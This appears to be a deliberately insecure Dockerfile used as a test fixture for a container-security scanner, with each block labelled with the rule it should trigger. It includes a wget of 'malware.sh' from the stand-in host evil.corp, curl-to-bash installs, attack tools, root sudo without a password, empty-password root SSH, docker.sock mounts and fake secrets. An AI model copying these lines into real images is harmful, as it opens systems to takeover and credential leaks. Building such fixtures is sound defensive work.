# ======================================================
# ShieldOps AutoFix — Visual Test Dockerfile v1
# يغطي أبرز الـ rules عشان نشوف نتيجة الإضافات الجديدة
# ======================================================

# ════════════════════════════════════════
# STAGE 1 — Builder
# ════════════════════════════════════════

# Rule #1 — Unpinned base image (latest)
FROM node:latest AS builder

# Rule #2 — Hardcoded ARG secrets
ARG API_KEY=sk_live_AbCdEfGhIjKlMnOpQrStUvWxYz
ARG DB_PASS=Str0ngP@ssw0rd!2024
ARG STRIPE_SECRET=sk_live_51NxxxxxxxxxxxxxxxxxxxxxxxxxX
ARG PRIVATE_KEY=-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAK

# Rule #3 — apt without cleanup
RUN apt-get install -y build-essential gcc g++ make cmake

# Rule #4 — curl without --fail
RUN curl -H "Authorization: Bearer sk_live_AbCdEfGhIjKlMnOpQrStUvWxYz" \
    https://api.example.com/config -o /tmp/config.json

# Rule #5 — Remote script piped to bash
RUN curl -fsSL https://get.docker.com | bash

# Rule #6 — SSH insecure config
RUN apt-get install -y openssh-server && \
    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config && \
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config && \
    echo "PermitEmptyPasswords yes" >> /etc/ssh/sshd_config

# Rule #7 — sudo NOPASSWD
RUN echo "root ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
RUN echo "deploy ALL=(ALL) NOPASSWD: /usr/bin/node" >> /etc/sudoers

# Rule #8 — Heredoc with attack tools + NOPASSWD + wget http
RUN <<EOF
apt-get install -y nmap telnet masscan hydra aircrack-ng john tcpdump wireshark netcat-traditional
wget http://evil.corp/malware.sh -O /tmp/setup.sh
echo "root ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
EOF

# Rule #9 — Temp files not cleaned
RUN gcc -o /tmp/preprocess /src/preprocess.c
RUN make -C /src/native build
RUN wget https://github.com/project/release.tar.gz -O /tmp/release.tar.gz
RUN tar -xzf /tmp/release.tar.gz -C /tmp/extracted

# Rule #10 — apt install without --no-install-recommends
RUN apt-get install -y curl wget openssh-server sudo nmap

# Rule #11 — Sensitive files copied into image
COPY .env.production /builder/.env
WORKDIR /builder
COPY secrets/jwt.pem /builder/secrets/jwt.pem
COPY id_rsa /root/.ssh/id_rsa
COPY id_rsa.pub /root/.ssh/authorized_keys
COPY .aws/credentials /builder/.aws/credentials

# Rule #12 — mysql secret in RUN command
RUN mysql -u root -pStr0ngP@ssw0rd!2024 -e "CREATE DATABASE prod;"

# Rule #13 — Hardcoded ENV secrets
ENV STRIPE_SECRET_KEY=sk_live_51NxxxxxxxxxxxxxxxxxxxxxxxxxX
ENV DATABASE_URL=postgresql://superadmin:Str0ngP@ssw0rd@prod-db.internal:5432/payments
ENV JWT_SECRET=super_jwt_secret_key_do_not_share
ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
ENV REDIS_AUTH=redis_auth_token_production
ENV SENDGRID_API_KEY=SG.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

# ════════════════════════════════════════
# STAGE 2 — Runtime
# ════════════════════════════════════════
FROM node:18-slim

# Rule #14 — WORKDIR after COPY
COPY --from=builder /builder/dist /app/dist
COPY --from=builder /builder/.env /app/.env
COPY --from=builder /builder/secrets/jwt.pem /app/secrets/jwt.pem
WORKDIR /app

# Rule #15 — Sensitive ports exposed
EXPOSE 22
EXPOSE 3306
EXPOSE 5432
EXPOSE 6379
EXPOSE 27017
EXPOSE 2375
EXPOSE 2376
EXPOSE 9200
EXPOSE 9300
EXPOSE 5601
EXPOSE 15672
EXPOSE 7474
EXPOSE 80

# Rule #16 — apt without cleanup (runtime stage)
RUN apt-get install -y curl
RUN apt-get install -y wget
RUN apt-get install -y openssh-server
RUN apt-get install -y sudo
RUN apt-get install -y nmap

# Rule #17 — SSH PermitRootLogin in runtime
RUN echo "PermitRootLogin yes" >> /etc/ssh/sshd_config

# Rule #18 — pip install attack/infra tools
RUN pip3 install ansible fabric paramiko
RUN pip3 install boto3 awscli

# Rule #19 — curl|bash (remote script)
RUN curl -fsSL https://get.docker.com | bash

# Rule #20 — chmod 777
RUN chmod -R 777 /app

# Rule #21 — sudo NOPASSWD again
RUN echo "root ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Rule #22 — Sensitive VOLUME mounts
VOLUME ["/etc", "/root", "/var/run/docker.sock", "/proc", "/sys"]
VOLUME ["/var/run/docker.sock:/var/run/docker.sock"]

# Rule #23 — Broad COPY (whole context)
COPY . /app

# Rule #24 — curl without --fail (second occurrence)
RUN curl -o /tmp/node-addon.tar.gz https://cdn.example.com/addon.tar.gz
RUN tar -xzf /tmp/node-addon.tar.gz

# Rule #25 — SSH PermitRootLogin (runtime again)
RUN echo "PermitRootLogin yes" >> /etc/ssh/sshd_config

# Rule #26 — pip install as root without venv
RUN pip3 install --no-cache-dir \
    ansible \
    fabric \
    paramiko \
    boto3 \
    awscli

# Rule #27 — No non-root USER directive
# (missing USER instruction — running as root)

# Rule #28 — No HEALTHCHECK
# (missing HEALTHCHECK)

# Rule #29 — CMD in shell form + debug flags
CMD node server.js --inspect=0.0.0.0:9229 --debug --env=development --host=0.0.0.0 --port=80

# Rule #30 — No ENTRYPOINT defined
# (missing ENTRYPOINT)

# Rule #31 — No OCI LABEL schema
# (missing LABEL)

# Rule #32 — No STOPSIGNAL
# (missing STOPSIGNAL)

# Rule #33 — Privileged port binding (<1024)
# EXPOSE 80 already declared above (port 80 < 1024)
